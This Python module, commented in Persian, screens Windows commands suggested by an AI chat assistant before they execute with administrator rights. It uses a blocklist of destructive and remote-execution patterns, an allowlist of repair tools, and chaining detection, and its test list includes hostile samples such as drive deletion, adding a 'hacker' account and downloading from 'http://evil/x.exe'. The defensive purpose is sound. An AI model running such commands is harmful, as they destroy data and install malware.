# -*- coding: utf-8 -*-
"""
command_guard.py — دروازه امنیتی اجرای دستورات پیشنهادی AI
====================================================================
چرا این ماژول لازم است؟

قابلیت «اجرای مستقیم کد از داخل چت» یعنی متنی که از یک سرور AI خارجی
می‌آید، می‌تواند روی سیستم کاربر با دسترسی Administrator اجرا شود.
بدون کنترل، این یک مسیر مستقیم برای اجرای کد مخرب است:

  • مدل ممکن است دچار توهم (hallucination) شود
  • پاسخ API ممکن است در مسیر دستکاری شود (خصوصاً چون verify=False است)
  • prompt injection: کاربر متنی می‌چسباند که مدل را وادار به پیشنهاد
    دستور مخرب می‌کند

این ماژول هر دستور را پیش از اجرا در سه لایه بررسی می‌کند:
  ۱. لیست سیاه الگوهای مخرب (فرمت، حذف، خاموشی، دانلود و اجرا)
  ۲. لیست سفید دستورات شناخته‌شده تعمیر ویندوز
  ۳. تشخیص متاکاراکترهای شل که امکان زنجیره‌سازی می‌دهند
"""

import re

# ---------------------------------------------------------------------------
# لایه ۱ — الگوهای صریحاً ممنوع
# ---------------------------------------------------------------------------
BLOCKED_PATTERNS = [
    # تخریب داده
    (r'\bformat\s+[a-z]:', 'فرمت کردن درایو'),
    # del با هر ترتیبی از فلگ‌ها (/f /s /q یا /q /s /f و...) روی مسیر سیستمی
    (r'\bdel\b(\s+/\w+)*\s+["\']?[a-z]:[\\/]', 'حذف فایل‌ها از مسیر درایو'),
    (r'\bdel\b(\s+/\w+)*\s+["\']?%(systemroot|windir|programfiles)%', 'حذف فایل‌های سیستمی'),
    (r'\berase\b(\s+/\w+)*\s+["\']?[a-z]:[\\/]', 'حذف فایل‌ها از مسیر درایو'),
    (r'\brd\s+/s\s+/q\s+[a-z]:\\?\s*$', 'حذف ریشه درایو'),
    (r'\bdiskpart\b', 'ابزار پارتیشن‌بندی (خطر حذف پارتیشن)'),
    (r'\bcipher\s+/w', 'پاک‌سازی غیرقابل‌بازگشت فضای دیسک'),
    (r'\bvssadmin\s+delete\s+shadows', 'حذف نقاط بازگردانی (رفتار باج‌افزار)'),
    (r'\bwbadmin\s+delete', 'حذف نسخه پشتیبان'),
    (r'\bbcdedit\b.*\b(delete|deletevalue)\b', 'دستکاری بوت‌لودر'),

    # اجرای کد از راه دور
    (r'\b(iwr|invoke-webrequest|curl|wget|certutil).*\b(-o|-outfile|urlcache)', 'دانلود فایل از اینترنت'),
    (r'\binvoke-expression\b|\biex\b', 'اجرای رشته به‌عنوان کد'),
    (r'\bdownloadstring\b|\bdownloadfile\b', 'دانلود و اجرا'),
    (r'-e(nc|ncodedcommand)?\s+[A-Za-z0-9+/=]{6,}', 'دستور PowerShell رمزنگاری‌شده'),
    (r'\bmshta\b|\bregsvr32\b.*\bscrobj', 'اجرای کد از راه دور (LOLBin)',),

    # کاربران و دسترسی
    (r'\bnet\s+user\s+\S+\s+\S+\s*/add', 'ساخت حساب کاربری جدید'),
    (r'\bnet\s+localgroup\s+administrators.*\/add', 'افزودن کاربر به گروه ادمین'),
    (r'\breg\s+(delete|add)\b', 'ویرایش مستقیم رجیستری'),

    # غیرفعال‌سازی امنیت
    (r'set-mppreference.*disablerealtimemonitoring.*\$?true', 'خاموش کردن آنتی‌ویروس'),
    (r'\bnetsh\s+advfirewall\s+set\s+.*state\s+off', 'خاموش کردن فایروال'),
    (r'\bsc\s+(delete|stop)\s+(windefend|wuauserv|winmgmt)', 'حذف/توقف سرویس حیاتی'),

    # خاموشی و ری‌استارت بدون هشدار
    (r'\bshutdown\b(?!.*\/a)', 'خاموش یا ری‌استارت کردن سیستم'),
    (r'\btaskkill\s+/f\s+/im\s+(explorer|winlogon|csrss)', 'کشتن فرآیند حیاتی'),

    # فورک‌بمب و حلقه
    (r'%0\s*\|\s*%0', 'فورک‌بمب'),
    (r'\bfor\b.*\bin\b.*\bdo\b.*\bstart\b', 'حلقه اجرای مکرر'),
]

# ---------------------------------------------------------------------------
# لایه ۲ — دستورات مجاز شناخته‌شده
# ---------------------------------------------------------------------------
# هر ورودی: (الگوی regex، توضیح فارسی، نیاز به ادمین)
ALLOWED_COMMANDS = [
    (r'^sfc\s+/scannow$', 'اسکن و بازسازی فایل‌های سیستمی', True),
    (r'^sfc\s+/verifyonly$', 'بررسی فایل‌های سیستمی (بدون تعمیر)', True),
    (r'^dism\s+/online\s+/cleanup-image\s+/(checkhealth|scanhealth|restorehealth)$',
     'بررسی یا تعمیر ایمیج ویندوز', True),
    (r'^chkdsk\s+[a-z]:\s*(/scan|/f|/r)?$', 'بررسی سلامت دیسک', True),

    (r'^ipconfig\s*(/all|/flushdns|/release|/renew|/displaydns|/registerdns)?$',
     'مدیریت پیکربندی شبکه', False),
    (r'^netsh\s+winsock\s+reset$', 'بازنشانی Winsock', True),
    (r'^netsh\s+int\s+ip\s+reset$', 'بازنشانی پشته TCP/IP', True),
    (r'^netsh\s+wlan\s+show\s+\w+$', 'نمایش اطلاعات وای‌فای', False),
    (r'^ping\s+[\w\.\-]+(\s+-[nwt]\s*\d*)*$', 'تست اتصال شبکه', False),
    (r'^tracert\s+[\w\.\-]+$', 'ردیابی مسیر شبکه', False),
    (r'^nslookup\s+[\w\.\-]+$', 'جست‌وجوی DNS', False),
    (r'^netstat\s+-[anob]+$', 'نمایش اتصالات شبکه', True),
    (r'^arp\s+-[ad]\s*.*$', 'جدول ARP', True),

    (r'^powercfg\s+(/energy|/batteryreport|/sleepstudy|/a|/list)$',
     'گزارش مصرف انرژی', True),
    (r'^systeminfo$', 'اطلاعات سیستم', False),
    (r'^tasklist(\s+/\w+)*$', 'لیست فرآیندها', False),
    (r'^driverquery(\s+/\w+)*$', 'لیست درایورها', False),
    (r'^pnputil\s+/enum-devices(\s+/[\w\-]+)*$', 'فهرست دستگاه‌ها و مشکلات آن‌ها', True),
    (r'^pnputil\s+/enum-drivers$', 'فهرست درایورهای نصب‌شده', True),
    (r'^dxdiag(\s+/\w+(\s+[\w\.\\:]+)?)*$', 'گزارش عیب‌یابی DirectX', False),
    (r'^nvidia-smi(\s+[\w\-\.=,/]+)*$', 'وضعیت کارت گرافیک NVIDIA', False),
    (r'^wmic\s+(path\s+\w+\s+)?\w*\s*get\s+[\w,\s]+$', 'استعلام اطلاعات سخت‌افزار', False),
    (r'^getmac(\s+/\w+)*$', 'نمایش آدرس MAC', False),
    (r'^whoami(\s+/\w+)*$', 'نمایش کاربر جاری', False),
    (r'^hostname$', 'نام سیستم', False),
    (r'^ver$', 'نسخه ویندوز', False),

    (r'^cleanmgr(\s+/\w+(:\d+)?)*$', 'پاک‌سازی دیسک', False),
    (r'^defrag\s+[a-z]:\s*(/[a-z])*$', 'یکپارچه‌سازی دیسک', True),

    # ابزارهای گرافیکی ویندوز (فقط باز می‌شوند)
    # پسوند .msc اختیاری است — ویندوز هر دو حالت را می‌پذیرد
    (r'^(devmgmt|services|eventvwr|diskmgmt|taskschd|perfmon|compmgmt|gpedit|secpol|lusrmgr|wf|fsmgmt|rsop|certmgr|printmanagement)(\.msc)?$',
     'باز کردن کنسول مدیریتی', True),
    (r'^(msinfo32|resmon|taskmgr|control|regedit|msconfig|dxdiag|cleanmgr|mdsched)(\.exe)?$',
     'باز کردن ابزار سیستمی', False),
    (r'^(appwiz|ncpa|firewall|powercfg|sysdm|inetcpl|desk|mmsys|timedate|intl)\.cpl$',
     'باز کردن کنترل پنل', False),
    (r'^start\s+ms-settings:[\w\-]*$', 'باز کردن تنظیمات ویندوز', False),
    (r'^explorer(\.exe)?\s+.*$', 'باز کردن پوشه', False),

    (r'^gpupdate\s*(/force)?$', 'به‌روزرسانی Group Policy', True),
    (r'^wuauclt\s*/\w+$', 'کنترل Windows Update', True),
    (r'^slmgr\s+/\w+$', 'مدیریت لایسنس', True),
    (r'^bcdedit(\s+/enum)?$', 'نمایش پیکربندی بوت', True),
]

# متاکاراکترهایی که امکان زنجیره‌سازی دستور می‌دهند
SHELL_METACHARS = re.compile(r'[;&|><`$\n\r]|\|\||&&')


def analyze(cmd):
    """
    یک دستور را تحلیل و به یکی از سه سطح دسته‌بندی می‌کند.

    سطوح ریسک:
        safe     → در لیست سفید است. با یک کلیک اجرا می‌شود.
        caution  → ناشناخته است. با تأیید صریح کاربر قابل اجراست.
        blocked  → خطر تخریب جدی. حتی با تأیید هم اجرا نمی‌شود.

    خروجی dict:
        allowed        : bool — بدون تأیید اضافه اجرا می‌شود؟
        needs_consent  : bool — با تأیید کاربر قابل اجراست؟
        reason         : str  — توضیح یا دلیل
        needs_admin    : bool — نیاز به UAC
        risk           : 'safe' | 'caution' | 'blocked'
    """
    def result(allowed, reason, risk, admin=False, consent=False, normalized=None):
        return {
            "allowed": allowed,
            "needs_consent": consent,
            "reason": reason,
            "needs_admin": admin,
            "risk": risk,
            "normalized": normalized if normalized is not None else (cmd or "").strip(),
        }

    if not cmd or not isinstance(cmd, str):
        return result(False, "دستور خالی است.", "blocked")

    raw = cmd.strip()
    # حذف پیشوندهای رایج که مدل اضافه می‌کند
    normalized = re.sub(r'^(cmd(\.exe)?\s+/[kc]\s+|powershell(\.exe)?\s+(-\w+\s+)*(-command\s+)?)',
                        '', raw, flags=re.IGNORECASE).strip()
    normalized = normalized.strip('"\'')
    low = normalized.lower()

    if len(raw) > 400:
        return result(False, "دستور بیش از حد طولانی است (احتمال کد مخرب).", "blocked")

    # ── لایه ۱: لیست سیاه ──
    # مهم: هم روی رشته خام و هم روی نسخه نرمال‌شده بررسی می‌کنیم.
    # اگر فقط normalized بررسی شود، پیشوندهایی مثل «powershell -enc» حذف
    # شده‌اند و الگوی مربوط به آن‌ها دیگر تطبیق پیدا نمی‌کند.
    raw_low = raw.lower()
    for pattern, label in BLOCKED_PATTERNS:
        if re.search(pattern, raw_low, re.IGNORECASE) or re.search(pattern, low, re.IGNORECASE):
            return result(False, f"دستور مسدود شد — {label}. این دستور می‌تواند به سیستم "
                                 "آسیب جدی برساند و حتی با تأیید هم اجرا نمی‌شود.", "blocked")

    # رشته base64 طولانی و تنها = خروجی حذف پیشوند -enc
    if re.fullmatch(r'[A-Za-z0-9+/=]{16,}', normalized) and '=' in normalized + '=':
        if re.search(r'-e(nc|ncodedcommand)?\b', raw_low):
            return result(False, "دستور مسدود شد — کد رمزنگاری‌شده PowerShell.", "blocked")

    # ── لایه ۲: لیست سفید — اجرای مستقیم ──
    for pattern, desc, admin in ALLOWED_COMMANDS:
        if re.match(pattern, low, re.IGNORECASE):
            return result(True, desc, "safe", admin=admin, normalized=normalized)

    # ── لایه ۳: متاکاراکترهای شل — ناشناخته و پرریسک ──
    if SHELL_METACHARS.search(normalized):
        return result(False,
                      "این دستور شامل کاراکترهای زنجیره‌سازی (& | ; > <) است و چند دستور را "
                      "پشت‌سرهم اجرا می‌کند. پیش از تأیید، محتوای آن را با دقت بررسی کنید.",
                      "caution", admin=True, consent=True, normalized=normalized)

    # ── ناشناخته — با تأیید صریح کاربر قابل اجراست ──
    return result(False,
                  "این دستور در فهرست دستورات شناخته‌شده نیست. اگر منبع آن را می‌شناسید و "
                  "از عملکردش مطمئن هستید، می‌توانید با تأیید خودتان آن را اجرا کنید.",
                  "caution", admin=True, consent=True, normalized=normalized)


def looks_like_command(line):
    """
    آیا این خط واقعاً یک دستور ویندوزی است یا متن توضیحی؟

    مدل‌های زبانی اغلب داخل بلوک کد، توضیح فارسی هم می‌نویسند:
        ```
        sfc /scannow
        پاک‌سازی کش Windows Update (اگر نیاز باشد)
        ```
    خط دوم دستور نیست. اگر آن را اجرا کنیم، ویندوز خطای
    «Windows cannot find 'پاک‌سازی'» می‌دهد.
    """
    if not line:
        return False
    s = line.strip()

    # باید با حرف/عدد انگلیسی یا مسیر شروع شود
    if not re.match(r'^[A-Za-z][\w\.\-]*(\s|$)|^[A-Za-z]:\\|^%\w+%|^\\\\', s):
        return False

    # اگر حرف فارسی/عربی داشته باشد، متن توضیحی است — مگر داخل کوتیشن
    without_quoted = re.sub(r'"[^"]*"|\'[^\']*\'', '', s)
    if re.search(r'[\u0600-\u06FF]', without_quoted):
        return False

    # نشانه‌های جمله توضیحی
    if s.endswith((':', '،', '؛')):
        return False
    # پرانتز توضیحی فارسی مثل «(اگر نیاز باشد)»
    if re.search(r'\([^)]*[\u0600-\u06FF][^)]*\)', s):
        return False

    # اولین توکن باید نام یک برنامه/دستور باشد نه یک جمله
    first = s.split()[0]
    if len(first) > 40 or not re.match(r'^[\w\.\-\\/:%]+$', first):
        return False

    return True


# زبان‌هایی که یعنی «این بلوک، دستور اجرایی ویندوز است»
EXECUTABLE_LANGS = {
    'cmd', 'bat', 'batch', 'dos', 'console',
    'powershell', 'ps', 'ps1', 'pwsh',
    'shell', 'terminal',
}

# نام برنامه‌های شناخته‌شده — برای بلوک بدون زبان که فقط یک خط دارد
_KNOWN_BINARIES = re.compile(
    r'^(sfc|dism|chkdsk|ipconfig|netsh|ping|tracert|nslookup|netstat|arp|'
    r'powercfg|systeminfo|tasklist|taskkill|driverquery|wmic|getmac|whoami|'
    r'hostname|ver|cleanmgr|defrag|gpupdate|wuauclt|slmgr|bcdedit|sc|net|'
    r'reg|schtasks|shutdown|explorer|control|start|del|rd|md|copy|move|'
    r'dxdiag|msinfo32|resmon|taskmgr|regedit|msconfig|mdsched|'
    r'nvidia-smi|winget|choco|pip|npm|git|docker)\b', re.IGNORECASE)


def extract_commands(text, strict=True):
    """
    دستورات ویندوزی را از متن پاسخ AI استخراج می‌کند.

    قرارداد با مدل (strict=True — پیش‌فرض):
        فقط بلوک‌هایی که زبانشان صریحاً cmd/powershell/bat است اجرایی‌اند:

            ```cmd
            sfc /scannow
            ```

        این کار جلوی خطای رایج را می‌گیرد که کلمات انگلیسی داخل تک‌بک‌تیک
        (مثل `Chrome`، `Event Viewer`، `config.ini`) به‌اشتباه دستور
        تلقی می‌شدند و ویندوز خطای «cannot find» می‌داد.

    بلوک بدون زبان فقط وقتی پذیرفته می‌شود که خطش با نام یک برنامه
    شناخته‌شده ویندوز شروع شود — این حالت برای سازگاری با مدل‌هایی است
    که برچسب زبان نمی‌گذارند.
    """
    if not text:
        return []

    # ── پاک‌سازی بخش استدلال مدل ──
    # مدل‌های reasoning داخل <think> قواعد را نقل‌قول می‌کنند و نمونه دستور
    # می‌نویسند؛ آن‌ها پیشنهاد واقعی نیستند.
    #
    # نکته مهم: <think> ممکن است بسته نشود (استریم ناقص). در آن حالت
    # نباید کل متن را دور بریزیم، چون بلوک‌های cmd واقعی معمولاً بعد از
    # آن می‌آیند. پس فقط تا اولین fence اجرایی پاک می‌کنیم.
    def _strip_think(s):
        # حالت بسته — امن است
        s = re.sub(r'&lt;think&gt;.*?&lt;/think&gt;', '\n', s, flags=re.S | re.I)
        s = re.sub(r'<think>.*?</think>', '\n', s, flags=re.S | re.I)

        # حالت باز و بسته‌نشده
        m = re.search(r'(?:&lt;think&gt;|<think>)', s, re.I)
        if not m:
            return s
        head, tail = s[:m.start()], s[m.end():]
        # اولین بلوک کد اجرایی در دنباله را پیدا کن و از آنجا نگه دار
        fence_at = re.search(r'^[ \t]{0,8}`{3,}[ \t]*(cmd|bat|batch|powershell|ps1|pwsh|shell)\b',
                             tail, re.I | re.M)
        if fence_at:
            return head + '\n' + tail[fence_at.start():]
        # وگرنه از اولین عنوان مارک‌داون یا خط پررنگ
        sec = re.search(r'^\s*(\*\*|##|###)', tail, re.M)
        return head + '\n' + (tail[sec.start():] if sec else tail)

    text = _strip_think(text)

    found, seen = [], set()

    def add(line, trusted):
        line = line.strip().lstrip('>$#').strip()
        line = re.sub(r'^(PS\s+[A-Za-z]:\\[^>]*>|C:\\[^>]*>)\s*', '', line)  # حذف prompt
        if not line or line.startswith(('#', '//', 'REM', 'rem ')):
            return
        if not looks_like_command(line):
            return
        # بلوک بدون برچسب زبان → فقط برنامه‌های شناخته‌شده
        if not trusted and not _KNOWN_BINARIES.match(line):
            return
        if line.lower() in seen:
            return
        seen.add(line.lower())
        found.append(line)

    # بلوک‌های چندخطی — ترتیب حفظ می‌شود
    #
    # الگو باید این حالت‌های واقعی را پوشش دهد:
    #   • تورفتگی پیش از ``` (مدل‌ها اغلب داخل لیست، بلوک را تورفته می‌نویسند)
    #   • بیش از سه بک‌تیک (```` یا بیشتر)
    #   • خطوط خالی داخل بلوک
    #   • برچسب زبان با فاصله اضافه: ``` cmd
    fence = re.compile(
        r'^[ \t]{0,8}(`{3,})[ \t]*(\w*)[ \t]*\n'   # باز شدن + زبان
        r'(.*?)'                                    # بدنه
        r'^[ \t]{0,8}\1[ \t]*$',                    # بستن با همان تعداد بک‌تیک
        re.S | re.M)

    matched_any = False
    for m in fence.finditer(text):
        matched_any = True
        lang = (m.group(2) or '').lower()
        trusted = lang in EXECUTABLE_LANGS
        for line in m.group(3).split('\n'):
            add(line, trusted)

    # پشتیبان: اگر الگوی سخت‌گیرانه چیزی پیدا نکرد ولی متن ```cmd دارد،
    # با روش ساده‌تر دوباره تلاش کن (بلوک ناقص یا بسته‌نشده)
    if not matched_any and re.search(r'`{3,}\s*(cmd|bat|powershell|ps1)', text, re.I):
        for lang, block in re.findall(r'`{3,}[ \t]*(\w*)[ \t]*\n?(.*?)(?=`{3,}|\Z)',
                                      text, re.S):
            trusted = (lang or '').lower() in EXECUTABLE_LANGS
            for line in block.split('\n'):
                add(line, trusted)

    # کدهای inline با تک‌بک‌تیک: در حالت strict اصلاً اجرایی نیستند.
    # اینجا جایی است که `Chrome` و `Event Viewer` قبلاً وارد می‌شدند.
    if not strict:
        for inline in re.findall(r'`([^`\n]{2,200})`', text):
            add(inline, False)

    results = []
    for c in found:
        info = analyze(c)
        results.append({"command": c, **info})
    return results


if __name__ == "__main__":
    tests = [
        "sfc /scannow",
        "ipconfig /flushdns",
        "DISM /Online /Cleanup-Image /RestoreHealth",
        "cmd.exe /k sfc /scannow",
        "devmgmt.msc",
        "format C:",
        "del /q /f /s C:\\*",
        "shutdown /s /t 0",
        "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
        "sfc /scannow && del important.txt",
        "net user hacker pass123 /add",
        "Invoke-WebRequest http://evil/x.exe -OutFile x.exe",
        "vssadmin delete shadows /all",
        "ping google.com",
        "rm -rf /",
    ]
    print(f"{'دستور':<52}{'نتیجه':<10}{'دلیل'}")
    print("-" * 110)
    for t in tests:
        r = analyze(t)
        mark = "✅ مجاز" if r["allowed"] else "🚫 رد"
        admin = " [ادمین]" if r.get("needs_admin") else ""
        print(f"{t[:50]:<52}{mark:<10}{r['reason'][:52]}{admin}")
